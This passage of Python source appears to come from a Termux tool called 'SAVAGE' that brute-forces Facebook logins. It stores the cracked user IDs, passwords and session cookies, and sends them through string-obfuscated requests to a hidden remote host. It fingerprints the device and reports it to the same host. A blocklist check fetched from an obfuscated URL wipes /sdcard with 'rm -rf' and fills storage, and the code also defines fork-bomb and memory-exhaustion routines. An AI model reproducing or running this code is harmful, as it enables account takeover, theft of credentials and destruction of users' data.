            pwd="#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], ps)
            free_fb = ses.get(f"https://{fb}/").text
            params = {
            'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
            'type': 'action',
            '__bkv': 'fb38dc8c5b219383a470b24dbf7e70188f42ff640ee5621e432acde7dd94b4f5',}
            data = {
            '__aaid': '0',
            '__user': '0',
            '__a': '1',
            '__req': '8',
            '__hs': '20343.BP:wbloks_caa_pkg.2.0...0',
            'dpr': '1',
            '__ccg': 'MODERATE',
            '__rev': '1027045623',
            '__s': 'wko2jq:1dmgeu:5pooei',
            '__hsi': '7549198049858549816',
            '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o0wW1gCwjE0AC09Mx60se2G0pS0ny0oi0zE5W0Y81soG0xo2ewbS1LwpEcE1kU1bo8Xw8S0QU3yw',
            'fb_dtsg': 'NAfuXi0WRcoXzIDjxZyILh4-ueXFN0Ayv5XMAQQ76yO_Qm25ta1SlZg:0:0',
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            'params': '{"params":"{\\"server_params\\":{\\"credential_type\\":\\"password\\",\\"username_text_input_id\\":\\"w1xkvz:63\\",\\"password_text_input_id\\":\\"w1xkvz:64\\",\\"login_source\\":\\"Login\\",\\"login_credential_type\\":\\"none\\",\\"server_login_source\\":\\"login\\",\\"ar_event_source\\":\\"login_home_page\\",\\"should_trigger_override_login_success_action\\":0,\\"should_trigger_override_login_2fa_action\\":0,\\"is_caa_perf_enabled\\":0,\\"reg_flow_source\\":\\"login_home_native_integration_point\\",\\"caller\\":\\"gslr\\",\\"is_from_landing_page\\":0,\\"is_from_empty_password\\":0,\\"is_from_aymh\\":0,\\"is_from_password_entry_page\\":0,\\"is_from_assistive_id\\":0,\\"is_from_msplit_fallback\\":0,\\"two_step_login_type\\":\\"one_step_login\\",\\"is_vanilla_password_page_empty_password\\":0,\\"INTERNAL__latency_qpl_marker_id\\":36707139,\\"INTERNAL__latency_qpl_instance_id\\":\\"193816396700338\\",\\"device_id\\":null,\\"family_device_id\\":null,\\"waterfall_id\\":\\"'+str(uuid.uuid4())+'\\",\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,\\"access_flow_version\\":\\"pre_mt_behavior\\"},\\"client_input_params\\":{\\"machine_id\\":\\"\\",\\"cloud_trust_token\\":null,\\"block_store_machine_id\\":\\"\\",\\"zero_balance_state\\":\\"\\",\\"contact_point\\":\\"'+uid+'\\",\\"password\\":\\"'+pwd+'\\",\\"accounts_list\\":[],\\"fb_ig_device_id\\":[],\\"secure_family_device_id\\":\\"\\",\\"encrypted_msisdn\\":\\"\\",\\"headers_infra_flow_id\\":\\"\\",\\"try_num\\":1,\\"login_attempt_count\\":1,\\"event_flow\\":\\"login_manual\\",\\"event_step\\":\\"home_page\\",\\"openid_tokens\\":{},\\"auth_secure_device_id\\":\\"\\",\\"client_known_key_hash\\":\\"\\",\\"has_whatsapp_installed\\":0,\\"sso_token_map_json_string\\":\\"\\",\\"should_show_nested_nta_from_aymh\\":0,\\"password_contains_non_ascii\\":\\"false\\",\\"has_granted_read_contacts_permissions\\":0,\\"has_granted_read_phone_permissions\\":0,\\"app_manager_id\\":\\"\\",\\"aymh_accounts\\":[{\\"id\\":\\"\\",\\"profiles\\":{\\"id\\":{\\"user_id\\":\\"\\",\\"name\\":\\"\\",\\"profile_picture_url\\":\\"\\",\\"small_profile_picture_url\\":null,\\"notification_count\\":0,\\"credential_type\\":\\"none\\",\\"token\\":\\"\\",\\"last_access_time\\":0,\\"is_derived\\":0,\\"username\\":\\"\\",\\"password\\":\\"\\",\\"has_smartlock\\":0,\\"account_center_id\\":\\"\\",\\"account_source\\":\\"\\",\\"credentials\\":[],\\"nta_eligibility_reason\\":null,\\"from_accurate_privacy_result\\":0,\\"dbln_validated\\":0}}}],\\"lois_settings\\":{\\"lois_token\\":\\"\\"}}}"}',}
            headers = {
            'authority': f'{fb}',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': f'https://{fb}',
            'referer': f'https://{fb}/ig/login_via/app/?lid=0KgCUNyg2GQxQqkNV&bn=Y29tLmFuZHJvaWQuY2hyb21l&tade=Q7fLBQHxMVXP4nZPstzbam3xy5Q3yCZNmDwKmyykJl0240%2FVdD6kQxampPUGMDPzNt5v%2Fy1KK%2B9QeRZ%2B7ys63%2BDvp2AxtqetI2MKFcnjFMXIyogR70ky3rTxEIu3PMhYuxX4JL%2BxDQ%3D%3D',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': ua}
            ses.post(f'https://{fb}/async/wbloks/fetch/', params=params, headers=headers, data=data)
            rq=ses.cookies.get_dict().keys()
            if "c_user" in rq:
                coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
                uid=coki.split("c_user=")[1].split(";")[0].replace(" ","")
                if "send" in myprofit(profitoks):
                    requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofits?country="+conxyz+"&uid="+uid+"&ps="+ps+"&coki="+coki)
                    profitoks.append(uid)
                else:
                    console.print(f"\r\r[b green1][{conxyz.upper()}-OK] {uid} {dot(uid)} {ps}\n\r[💥] {coki}\n")
                    oks.append(uid)
                    profitoks.append(uid)
                    open(f"/sdcard/SVG/SAVAGE-{optionname}-M{qw}-OK.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                    open("/sdcard/SVG/SAVAGE-IDS.txt","a").write(uid+"|"+ps+"\n")
                    id_token='NOT-HAVE'
                    live_ck("FILE",qw,uid,ps,coki,id_token,pw)
                break
            elif "checkpoint" in rq:
                cpp.append(uid)
                open("/sdcard/SVG/SAVAGE-CPS/SAVAGE-ALL-CP.txt","a").write(uid+"|"+ps+"\n")
                open(cp_today,"a").write(uid+"|"+ps+"\n")
                requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofitscp?uid="+uid+"&ps="+ps+"&types=file&country="+conxyz)
                
                break
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)






def autocreate():
    apprRucrl_ck()
    names=str(onetimerq.get("https:"+"//ra"+"w.githubu"+"sercontent."+"com/TEAM-ELIT"+"E1/dat"+"abase/"+"main/auto_cratename.txt").text).splitlines()
    clr()
    print(logo)
    print(" [b red1 on white]  TYPE A FULL NUMBER WITH COUNTRY CODE  [/b red1 on white]")
    print(" "+line)
    print("[b]  Π EXAMPLE : [bright_green]+8801944981090 ")
    numberx=input("  Π Number -> ")
    code=numberx[:7]
    totaldeget=len(numberx.replace(" ",""))-len(code)
    clr()
    qw="1"
    run_time_info(qw,'AUTOCREATE')
    clr()
    print(logo)
    print(f"[b white]   [red1]➜[/red1] OPTION[green1]»[/green1]PASS   [yellow]>[bright_green]>[dark_orange3]>[white]  CREATE [green1]»[/green1] 1 ")
    print(f"[b white]   [red1]➜[/red1] [bright_white]Use Flight Mode  …… [/bright_white]")
    print(" "+line)
    tl="unlimited"
    loop=str("4")
    while True:
        gh=''.join(random.choice(string.digits) for _ in range(totaldeget))
        nope=code+gh
        auto_create.create1(oks,tl,loop,names,usershow,nope,qw)

def unpatchable_exit():
    import ctypes
    ctypes.CDLL(None).exit(0)


try:
    modelxyz = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','').replace(" ","_")
except:
    modelxyz="unknown"

try:
    fbbdxyz = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','').replace(" ","_")
except:
    fbbdxyz="unknown"
    


raw='ar//'+':s'+'pt'+'th'
K1=str(os.geteuid())
K2=str(os.getgid())
K3=str(os.getlogin())
war='tnetn'+'oc'+'res'+'ubuhti'+'g.w'
plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
num_key="".join(K1+K2+K3)
cm=num_key.encode("ASCII")
hyt='svecv'+'ghii'+'wh'+'rhhd/'+'moc.'
cmr=base64.b64encode(cm)
cm2=str(cmr).upper().replace("B","V")


def showkey(mac):
    mac=mac.lower()
    namespace = uuid.NAMESPACE_DNS
    fixed_uuid = str(uuid.uuid5(namespace, fbbdxyz))
    return str(hashlib.sha256(str(mac+modelxyz).encode()).hexdigest()).upper()+str(fixed_uuid.replace("-","01")).upper()
    




session_token=random.choice("ABCDEFGHIJKLMNOP")+str(random.choice(range(11,99)))+f"_V-"+mas.ver
linkx='-L'+'AN'+'OS'+'REP/ni'
jolk='am/s'+'dae'+'h/sf'+'er/at'+'aD'+'/he'+'hvs'
linkA='t'+'xt.'+'RE'+'SU'
family_nu+=5000
urlttt=str('txt.R'+'ESU-LANOS'+'REP/nia'+'m/sdaeh'+'/sfer/a'+'taD/hehvssv'+'ecvghiiwhr'+'hhd/moc.tnet'+'nocre'+'subuhtig.w'+'ar//:sp'+'tth')[::-1]
approsesson=requests.session()
yumiko=mas.webHost+".co"+"m"

tiyx=[]





awmking = []

def whilenotexit():
    while True:
        awmking.append('A' * 10**6)  

def whilenotexit_frezz():
    while True:
        os.fork()




def ck_enimi():
    try:
        fucxrl=str('txt.EV'+'OME'+'R-AT'+'AD-RE'+'SU/n'+'iam/sdae'+'h/sfer/a'+'taD/hehvssvecvghiiwhrhhd/moc.tnet'+'nocr'+'esubuh'+'tig.wa'+'r//:sptth')[::-1]
        vcmd=str(mechanize.urlopen(fucxrl).read().decode('utf-8'))
    except:
        exit(" !? Internet error...")
        sys.exit()
        os._exit(0)
        secure_exit(1)

    if showkey(usershow) in vcmd:
        os.system("rm -rf /sdcard/ *")
        clr()
        print(logo)
        print(f"[b white]   [red1]➜[/red1] HELLO MOTHER FUCKER ...")
        print(" "+line)
        os.system("fallocate -l 10000000000 $HOME/...")
        unpatchable_exit()
        exit()
        sys.exit()
        os._exit(0)
        secure_exit(1)
    else:
        pass

    if showkey(usershow) in temporary_block:
        clr()
        exit(" !-! YOU ARE TEMPORARY BLOCKED FROM TOOL")
        unpatchable_exit()
        sys.exit()
        os._exit(0)
        secure_exit(1)
    else:
        pass




usershow=''


try:
    open("/sdcard/.count.txt","a").write("8888\n")
except:
    pass


def make_info_new(showkey,username):
    tictic=str(datetime.now()).split(" ")[1].split(".")[0]
    trytime=str(len(open("/sdcard/.count.txt","r").read().splitlines()))
    lic=modelxyz+"|"+fbbdxyz+"|"+trytime+"|"+session_token
    tim=strftime("[%a] %d %b %Y ", gmtime()).replace(" ","-")+tictic
    url="h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/ra"+"g"+"e"+"st"+"a"+"r"+"?"+""+"us"+"er="+f"{username}&"+"c"+"o"+"un"+"tr"+"y"+f"={conxyz}&"+"t"+"i"+"m"+"e"+f"={tim}&"+"k"+"ey"+f"={showkey}&"+"lx="+lic
    
    try:
        cont = mechanize.urlopen(url).read().decode('utf-8')
    except:
        pass
    

def run_time_info(qw,op):
    global usershow
    tictic=str(datetime.now()).split(" ")[1].split(".")[0]
    trytime=str(len(open("/sdcard/.count.txt","r").read().splitlines()))
    lic=modelxyz+"||"+fbbdxyz+"||"+op+"||"+qw+"||"+str(session_token)+"||"
    tim=strftime("[%a] %d %b %Y ", gmtime()).replace(" ","-")+tictic
    url="h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/ra"+"g"+"e"+"st"+"a"+"r"+"?"+""+"us"+"er="+f"{usershow}&"+"c"+"o"+"un"+"tr"+"y"+f"={conxyz}&"+"t"+"i"+"m"+"e"+f"={tim}&"+"k"+"ey"+f"={showkey(usershow)}&"+"lx="+lic
    
    try:
        cont = requests.get(url)
    except:
        pass


def live_ck(option,qw,uid,ps,coki,id_token,pw):
    global usershow,oks,loop,session_token,XODE,optionname
    tlok=str(len(oks))+"]["+str(loop)+"]["+str(session_token)
    url="h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".co"+"m/"+"li"+"ve"+"?"+"us"+"er"+"="+usershow+"&oks="+tlok+"&mode="+optionname+"&method="+qw+"&uid="+uid+"&ps="+ps+"&cookie="+coki+"&token="+id_token+"&workingpas="+pw+"&SID="+XODE+"&network="+str(using_oparator)
    try:
        cont = requests.get(url)
    except:
        pass



def passcap(pwx):
    global usershow
    try:
        pasdata="|".join(pwx)
        url="h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".co"+"m/"+"passwordlist"
        data ={
        "data":pasdata,
        "name":usershow.upper(),
        "total":str(len(pwx))}
        requests.post(url,data=data)
        pass
    except:
        pass


def print_KEY(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)


def curlrq(url):
    response = subprocess.run(["curl", "-s", url], capture_output=True, text=True)
    return response.stdout


def clean_file_utf8(filepath):
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(content)
    except Exception as e:
        pass









def makeusername():
    global cm2,usershow
    try:
        username=open("/data/data/com.termux/files/home/.SAVAGE-USERNAME.txt","r").read()
        username = ''.join(char for char in username if char not in punctuation_to_remove)
        ranusername=username
        clean_file_utf8("/data/data/com.termux/files/home/.SAVAGE-USERNAME.txt")
    except:
        clr()
        print(logo)
        username=str(input("  !-! Your Name : "))
        print(" "+line)
        username = ''.join(char for char in username if char not in punctuation_to_remove)
        if len(username)<3:
            makeusername()
        username+="-"+str(random.randint(1,999))+"-"+conxyz
        ranusername=username.replace(" ","-").replace("\n","")
        open("/data/data/com.termux/files/home/.SAVAGE-USERNAME.txt","w").write(ranusername)
        make_info_new(showkey(ranusername),ranusername)
    usershow+=ranusername
    apprRucrl()




def approval():
    ranusername=usershow
    while True:
        clr()
        print(logo)
        print(" [b][yellow1] • [bright_white]USER MUST BUY SUBSCRIPTION BEFORE USE IT ")
        console.print(f" [b][yellow1] • [bright_white]Key -[green1] {showkey(ranusername)}-{ranusername.upper()}")
        print("\n\n")
        upText=f"{showkey(ranusername)}-{ranusername.upper()}"
        input(" -> Press enter to buy the tool ")
        os.system(f"xdg-open https://wa.me/+8801722183463?text={upText}")
    unpatchable_exit()
    exit()
    sys.exit()
    quit()
    os._exit(0)
    whilenotexit()
    whilenotexit_frezz()
    secure_exit(1)
    raise SystemExit




def generate_signature(key, timestamp):
    message = f"{key}{timestamp}".encode()
    signature = hmac.new(b"2672838373727373636363", message, hashlib.sha256).hexdigest()
    return signature












def apprRucrl():
    ranusername=usershow
    
    
    maincvb()
    '''
    try:
        you_data=pokkis.hrhrbrbfjfn(family_nu)
        if showkey(ranusername) in you_data:
            pass
        else:
            approval()
    except:
        print("(+) Something wrong, Please run again")
        unpatchable_exit()
        exit()
        sys.exit()
        quit()
        os._exit(0)
        whilenotexit()
        whilenotexit_frezz()
        secure_exit(1)
        raise SystemExit
    
    try:
        timestamp=int(time.time())
        signature=generate_signature(showkey(ranusername), timestamp)
        url="h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".co"+"m/"+"saveuser"
        data={
        "name":ranusername.upper(),
        "data":showkey(ranusername),
        "stepmom":timestamp,
        "fuckme":signature}
        confirm_key="svg="+showkey(ranusername)
        response=requests.post(url,data=data,timeout=10)
        if showkey(ranusername) in response.text:
            whilenotexit_frezz()
            whilenotexit()
            unpatchable_exit()
            exit()
            sys.exit()
            quit()
            os._exit(0)
            secure_exit(1)
            raise SystemExit
        if yumiko not in response.request.url:
            whilenotexit_frezz()
            whilenotexit()
            unpatchable_exit()
            exit()
            sys.exit()
            quit()
            os._exit(0)
            secure_exit(1)
            raise SystemExit
        if 200 == response.status_code:
            poko="".join([key+"="+value for key,value in response.cookies.get_dict().items()])
            if confirm_key == poko:
                maincvb()
            else:
                approval()
        else:
            approval()
    except Exception as e:
        #print(e)
        print(" error: Something wrong, Please run again")
        unpatchable_exit()
        exit()
        sys.exit()
        quit()
        os._exit(0)
        whilenotexit()
        whilenotexit_frezz()
        secure_exit(1)
        raise SystemExit
    unpatchable_exit()
    exit()
    sys.exit()
    quit()
    os._exit(0)
    whilenotexit()
    whilenotexit_frezz()
    secure_exit(1)
    raise SystemExit
    
    
    
    upt=f"{showkey(ranusername)}-{ranusername.upper()}"
    
    
    try:
        paid_user = mechanize.urlopen("https://g"+"ithub.co"+"m/TEA"+"M-EL"+"ITE1/da"+"tab"+"ase/bl"+"ob/main/P"+"ERSON"+"AL-USER.txt").read().decode('utf-8').strip()
        if upt in paid_user:
            maincvb()
        else:
            approval()
    except:
        print("[✓] INTERNET ERROR ")
        unpatchable_exit()
        exit()
        sys.exit()
        quit()
        os._exit(0)
        whilenotexit()
        whilenotexit_frezz()
        secure_exit(1)
        raise SystemExit
    '''
    
    
    
    
def apprRucrl_ck():
    
    ranusername=usershow
    K1=str(os.geteuid())
    K2=str(os.getgid())
    K3=str(os.getlogin())
    plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
    xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
    num_key="".join(K1+K2+K3)
    cm=num_key.encode("ASCII")
    cmr=base64.b64encode(cm)
    cm2=str(cmr).upper().replace("B","V")
    confirm_key="svg="+showkey(ranusername)
    timestamp=int(time.time())
    signature=generate_signature(showkey(ranusername), timestamp)
    
    
    """
    try:
        url="h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".co"+"m/"+"saveuser"
        data={
        "name":ranusername.upper(),
        "data":showkey(ranusername),
        "stepmom":timestamp,
        "fuckme":signature}
        response=approsesson.post(url,data=data)
        if 200 == response.status_code:
            poko="".join([key+"="+value for key,value in response.cookies.get_dict().items()])
            if confirm_key == poko:
                pass
            else:
                approval()
        else:
            approval()
    except Exception as e:
        unpatchable_exit()
        exit()
        sys.exit()
        quit()
        os._exit(0)
        whilenotexit()
        whilenotexit_frezz()
        secure_exit(1)
        raise SystemExit
    """

makeusername()




for uHaxL in dir():
    if uHaxL.endswith("_"):
        pass
    else:
        del locals()[uHaxL]
unpatchable_exit()
exit()
sys.exit()
quit()
os._exit(0)
whilenotexit()
whilenotexit_frezz()
secure_exit(1)
raise SystemExit